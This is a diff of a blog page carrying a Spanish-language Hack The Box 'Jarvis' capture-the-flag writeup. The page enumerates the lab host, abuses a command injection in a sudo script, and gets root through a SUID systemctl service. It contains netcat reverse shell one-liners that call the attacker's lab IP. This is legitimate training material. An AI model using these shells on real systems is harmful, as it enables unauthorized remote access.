@@ -25,8 +25,8 @@ Service Enumeration
 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA) | 256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA) |_ 256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Stark Hotel 64999/tcp open http Apache httpd 2.4.25 ((Debian)) |_http-server-header: Apache/2." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://0xl3mon.github.io/htb/jarvis-htb-writeup/" />
-<meta property="article:published_time" content="2022-03-27T15:40:14+02:00" />
-<meta property="article:modified_time" content="2022-03-27T15:40:14+02:00" />
+<meta property="article:published_time" content="2022-02-28T15:40:14+02:00" />
+<meta property="article:modified_time" content="2022-02-28T15:40:14+02:00" />
 
 
   </head>
@@ -73,7 +73,7 @@ PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10&#43;deb9u6 (p
   <title>calendar</title>
   <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
 </svg>
-          Mar 27, 2022
+          Feb 28, 2022
         </div>
         <div>
           <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
@@ -112,15 +112,15 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 </code></pre></div><p><strong>Whatweb</strong></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">http://10.129.1.113 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.25<span style="color:#f92672">]</span>, Bootstrap, Cookies<span style="color:#f92672">[</span>PHPSESSID<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, Email<span style="color:#f92672">[</span>supersecurehotel@logger.htb<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Debian Linux<span style="color:#f92672">][</span>Apache/2.4.25 <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.129.1.113<span style="color:#f92672">]</span>, JQuery, Modernizr<span style="color:#f92672">[</span>2.6.2.min<span style="color:#f92672">]</span>, Open-Graph-Protocol, Script, Title<span style="color:#f92672">[</span>Stark Hotel<span style="color:#f92672">]</span>, UncommonHeaders<span style="color:#f92672">[</span>ironwaf<span style="color:#f92672">]</span>, X-UA-Compatible<span style="color:#f92672">[</span>IE<span style="color:#f92672">=</span>edge<span style="color:#f92672">]</span>
 </code></pre></div><h4 id="web-services">Web Services</h4>
-<p><code>dirsearch -u http://10.129.1.113 -w /usr/share/dirb/wordlists/common.txt -e &quot; &quot; -F -x &quot;400,404&quot; -t 100 -o webscan</code>
-Comenzaremos fuzzeando el servicio web para hacernos una idea de que directorios podemos encontrar.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">dirsearch -u http://10.129.1.113 -w /usr/share/dirb/wordlists/common.txt -e <span style="color:#e6db74">&#34; &#34;</span> -F -x <span style="color:#e6db74">&#34;400,404&#34;</span> -t <span style="color:#ae81ff">100</span> -o webscan
+</code></pre></div><p>Comenzaremos fuzzeando el servicio web para hacernos una idea de que directorios podemos encontrar.</p>
 <p><img src="https://i.imgur.com/R3U3roY.png" alt=""></p>
-<p>Vamos a enumerar el servicio web y por lo que notamos de entrada es una pagina web relacionada con un hotel.
-http://10.129.1.113/</p>
-<p><img src="https://i.imgur.com/lMGv3oL.png" alt=""></p>
-<p><strong>Fuzzing del servicio Web</strong>
-<code>nmap --script http-enum -p 80 10.129.1.113 -T4 -n -oN http-enum</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PORT   STATE SERVICE
+<p>Vamos a enumerar el servicio web y por lo que notamos de entrada es una pagina web relacionada con un hotel.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">http://10.129.1.113/
+</code></pre></div><p><img src="https://i.imgur.com/lMGv3oL.png" alt=""></p>
+<p><strong>Fuzzing del servicio Web</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap --script http-enum -p <span style="color:#ae81ff">80</span> 10.129.1.113 -T4 -n -oN http-enum
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">PORT   STATE SERVICE
 80/tcp open  http
 | http-enum: 
 |   /phpmyadmin/: phpMyAdmin
@@ -343,14 +343,14 @@ http://10.129.1.113/</p>
 </code></pre></div><p>analizando el script y nos damos cuenta que no filtra los caracteres <code>$()</code> donde podriamos inyectar comandos asi que realizaremos una pequeña prueba consultamos con El siguiente <a href="https://github.com/payloadbox/command-injection-payload-list">Recurso</a> donde nos lista varios payloads para injectar comandos</p>
 <p><code>sudo -u pepper /var/www/Admin-Utilities/simpler.py -p</code>
 <img src="https://i.imgur.com/ekhWBAY.png" alt=""></p>
-<p>ahora nos entablamos una reverse shell para eso vamos a crear un fichero y solamente lo ejecutaremos en la injection
-<code>/tmp/shell.sh</code></p>
+<p>ahora nos entablamos una reverse shell para eso vamos a crear un fichero y solamente lo ejecutaremos en la injection</p>
+<p><code>/tmp/shell.sh</code></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#!/bin/bash
 </span><span style="color:#75715e"></span>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.68 <span style="color:#ae81ff">443</span> &gt;/tmp/f
 </code></pre></div><p><img src="https://i.imgur.com/5g2z3Np.png" alt=""></p>
 <h3 id="priv-esc-pepper-to-root">Priv Esc Pepper To root</h3>
-<p><img src="https://i.imgur.com/cHZaPsa.png" alt="">
-enumerando con linpeas nos damos cuenta de que existe un fichero systemctl , con permisos ==SUID== del que podriamos aprovecharnos, asi que procedo a crearme el siguiente servicio</p>
+<p><img src="https://i.imgur.com/cHZaPsa.png" alt=""></p>
+<p>enumerando con linpeas nos damos cuenta de que existe un fichero systemctl , con permisos ==SUID== del que podriamos aprovecharnos, asi que procedo a crearme el siguiente servicio</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>Service<span style="color:#f92672">]</span>
 Type<span style="color:#f92672">=</span>notify
 ExecStart<span style="color:#f92672">=</span>/bin/bash -c <span style="color:#e6db74">&#34;nc -e /bin/bash 10.10.14.68 9090&#34;</span>
